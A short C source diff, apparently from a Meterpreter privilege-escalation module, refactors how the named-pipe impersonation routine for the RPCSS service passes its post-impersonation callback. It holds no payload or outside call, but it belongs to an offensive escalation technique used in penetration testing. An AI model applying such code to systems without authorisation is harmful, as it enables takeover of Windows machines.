@@ -298,6 +298,7 @@ DWORD elevate_via_service_namedpipe_rpcss(Remote* remote, Packet* packet)
 	OSVERSIONINFO os = { 0 };
 	HANDLE hPipe = NULL;
 	DWORD dwPipeUid[2] = { 0, 0 };
+	PRIV_POST_IMPERSONATION PostImpersonation;
 
 	do {
 		os.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
@@ -323,7 +324,9 @@ DWORD elevate_via_service_namedpipe_rpcss(Remote* remote, Packet* packet)
 		dprintf("[ELEVATE] elevate_via_service_namedpipe_rpcss. using pipename: %s", cPipeName1);
 
 		hSem = CreateSemaphore(NULL, 0, 1, NULL);
-		pThread = met_api->thread.create(elevate_namedpipe_thread, &cPipeName1, remote, hSem, post_callback_use_rpcss);
+		PostImpersonation.pCallback = post_callback_use_rpcss;
+		PostImpersonation.pCallbackParam = remote;
+		pThread = met_api->thread.create(elevate_namedpipe_thread, &cPipeName1, hSem, &PostImpersonation);
 		if (!pThread) {
 			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe_rpcss. met_api->thread.create failed", ERROR_INVALID_HANDLE);
 		}
